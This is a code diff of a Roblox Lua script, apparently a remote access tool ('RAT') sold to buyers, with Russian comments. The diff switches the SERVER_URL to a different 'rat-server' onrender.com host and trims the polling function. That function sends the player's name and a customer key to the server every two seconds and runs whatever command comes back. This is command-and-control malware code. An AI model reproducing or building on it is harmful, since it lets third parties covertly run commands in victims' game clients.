@@ -11,7 +11,7 @@ local CoreGui = game:GetService("CoreGui")
 local TeleportService = game:GetService("TeleportService")
 
 -- ========== КОНФИГУРАЦИЯ ПОКУПАТЕЛЯ (МЕНЯТЬ ТУТ!) ==========
-local SERVER_URL = "https://ratserver-6wo3.onrender.com"
+local SERVER_URL = "https://rat-server-pkgg.onrender.com"
 local CUSTOMER_KEY = "customer_key_1"  -- ВСТАВЬ СВОЙ КЛЮЧ!
 -- ============================================================
 
@@ -1261,14 +1261,12 @@ local function ExecuteCommand(cmd, args)
     end)
 end
 
--- Функция проверки команд с сервера (с таймаутом 5 секунд)
+-- Функция проверки команд с сервера
 local lastCommandCheck = 0
-local lastCommandResponse = 0
 
 local function checkCommands()
     local currentTime = os.time()
     
-    -- Не чаще чем раз в 2 секунды
     if currentTime - lastCommandCheck < 2 then
         return false
     end
@@ -1278,12 +1276,11 @@ local function checkCommands()
         return httpRequest({
             Url = SERVER_URL.."/data?player=" .. player.Name .. "&customer_key=" .. CUSTOMER_KEY,
             Method = "GET",
-            Timeout = 5  -- таймаут 5 секунд
+            Timeout = 5
         })
     end)
     
     if success and response and response.Body then
-        lastCommandResponse = currentTime
         local success, data = pcall(function()
             return HttpService:JSONDecode(response.Body)
         end)
@@ -1292,11 +1289,6 @@ local function checkCommands()
             ExecuteCommand(data.command, data.args or {})
             return true
         end
-    end
-    
-    -- Если нет ответа от сервера больше 5 секунд - считаем что отключен
-    if currentTime - lastCommandResponse > 5 then
-        -- Можно добавить логику переподключения если нужно
     end
     
     return false
